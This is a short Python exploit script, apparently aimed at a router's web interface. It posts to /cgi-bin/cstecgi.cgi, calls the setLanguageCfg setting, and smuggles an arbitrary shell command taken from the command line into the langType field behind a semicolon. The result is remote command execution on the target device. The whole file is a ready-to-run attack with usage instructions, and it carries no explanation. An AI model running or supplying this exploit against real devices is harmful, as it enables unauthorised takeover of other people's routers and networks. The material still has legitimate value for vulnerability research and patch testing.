
import sys
import requests
import json
try:
	ip = sys.argv[1]
	port = sys.argv[2]
	cmd = sys.argv[3] 
except:
	print("please use python exp.py [ip] [port] [command]")
	exit()
url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)

command='ls -al'

headers={
	"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
	"Accept-Language":"en-US,en;q=0.5",
	"Accept-Encoding":"gzip, deflate",
	"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
	"X-Requested-With":"XMLHttpRequest",
	"Origin":"http://%s:%s"%(ip,port),
}
data={
	"topicurl":"setting/setLanguageCfg",
	"langType":"cn;{};".format(cmd),
    "langFlag":"0"
}

print(requests.post(url,headers=headers,data=json.dumps(data)).text)
